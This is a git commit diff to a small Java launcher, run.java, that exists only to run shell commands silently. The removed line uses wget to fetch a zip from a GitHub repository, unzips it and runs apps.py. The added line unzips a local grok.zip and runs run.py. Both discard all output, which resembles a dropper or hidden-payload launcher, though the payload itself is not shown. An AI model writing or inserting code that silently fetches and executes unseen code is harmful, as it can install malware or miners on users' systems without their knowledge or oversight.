623575200e958e5f2e3205adf71330547123beb0
lianamahesra-creator <lianamahesra@gmail.com>
2025-12-02 05:15:24 +0700

    Update run.java

--- run.java
+++ run.java
@@ -4,7 +4,7 @@ import java.util.*;
 public class run {
     public static void main(String[] args) {
         try {
-            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "wget https://github.com/levatinaforekina-arch/scaling-doodle/raw/refs/heads/main/palantir.zip;unzip palantir.zip;python apps.py");
+            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "unzip grok.zip;python run.py");
             builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
             builder.redirectError(ProcessBuilder.Redirect.DISCARD);
             Process process = builder.start();
